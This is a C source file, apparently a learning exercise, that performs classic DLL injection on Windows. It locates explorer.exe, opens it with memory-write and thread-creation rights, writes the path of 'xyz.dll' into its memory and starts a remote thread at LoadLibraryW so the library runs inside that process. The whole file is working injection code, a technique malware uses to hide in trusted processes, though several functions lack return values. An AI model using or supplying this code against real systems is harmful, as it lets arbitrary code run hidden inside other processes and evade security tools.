#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <synchapi.h>
#include <fileapi.h>
#include <libloaderapi.h>

// declarations
DWORD pid = 0;
LPCWSTR rel_path = L"xyz.dll";
HANDLE hProc = NULL;
wchar_t abs_path [MAX_PATH];
SIZE_T dllsz = 0;
LPVOID maddr = NULL;
HMODULE hDLL = NULL;
FARPROC proc_addr = NULL;
HANDLE hThread = NULL;

// resolve absolute path of imported DLL
void get_path(LPCWSTR rel_path){
    DWORD len = GetFullPathNameW(rel_path, MAX_PATH, abs_path, NULL);
    if (len == 0){
        printf("couldn't resolve absolute path for dll");
    };
};

// get target procID
DWORD FindPID(LPCWSTR trgproc){
    DWORD pid = 0; // fallback value in the case we dont get an actual PID
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
    // creates snapshot of all processes on the system, HANDLE used to reference the kernel object created

    if (hSnap == INVALID_HANDLE_VALUE){
        printf("failed to take snapshot of processes");
        return 0;
    };

    PROCESSENTRY32W trgt; // creates a PROCESSENTRY32W struct for trgt
    trgt.dwSize = sizeof(trgt);

    if (Process32FirstW(hSnap, &trgt)){
        do{
            if (_wcsicmp(trgt.szExeFile, trgproc) == 0){ // compares current process' exe name w/ what we're looking for
                pid = trgt.th32ProcessID; // goes into a loop of searching for pids
                printf("found process %ls with pid %lu", trgt.szExeFile, pid); // outputs the procname and pid
                break; // exits the loop (no duh)
            }
        } while (Process32NextW(hSnap, &trgt)); // goes on to next process and fills trgt with fresh data


    }
    CloseHandle(hSnap); // cleanup so we dont leak a kernel resource
    return pid;
};


// allocate memory in process
LPVOID mem_alloc(HANDLE hProc){
    maddr = VirtualAllocEx(hProc, NULL, dllsz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!maddr){
        printf("failed to allocate memory");
    };
    return maddr;
};

// check the file exists
DWORD checkfile(LPCWSTR dllpath){
    DWORD attrib = GetFileAttributesW(abs_path);
    if (attrib == INVALID_FILE_ATTRIBUTES){
        printf("couldn't get DLL file");
    };
};


// write dll to remote memory
BOOL writemem(HANDLE hProc, LPVOID mem_addr){
    BOOL dll_write = WriteProcessMemory(hProc, mem_addr, abs_path, dllsz, NULL);
};

// get handle to system dll (i.e. kernel32)
HMODULE get_dll(LPCWSTR modname){
    hDLL = GetModuleHandleW(modname);
    if (hDLL == NULL){
        printf("couldn't get handle to dll");
    };
    return hDLL;
};

// resolve address of process in dll
FARPROC resolve_address(HMODULE hDLL, LPCSTR ProcName){
    proc_addr = GetProcAddress(hDLL, ProcName);
    if (proc_addr == NULL){
        printf("failed to resolve address in dll");
    };
    return proc_addr;
};

// create thread and trigger execution
HANDLE trigger_exec(HANDLE hProc, LPVOID mem_addr, LPTHREAD_START_ROUTINE proc_addr){
    hThread = CreateRemoteThread(hProc, NULL, 0, proc_addr, mem_addr, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
};


int main(){
    get_path(rel_path);
    checkfile(abs_path);
    dllsz = (wcslen(abs_path) + 1) * sizeof(wchar_t); // re-declare dll size (we need size of bytes, thats why we multiply by datatype)
    pid = FindPID(L"explorer.exe");
    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid); // open process with rights
    if (hProc == NULL){
     printf("failed to open the process");
    };
    maddr = mem_alloc(hProc);
    writemem(hProc, maddr);
    hDLL = get_dll(L"kernel32");
    proc_addr = resolve_address(hDLL, "LoadLibraryW");
    trigger_exec(hProc, maddr, (LPTHREAD_START_ROUTINE)proc_addr);
    return 0;
};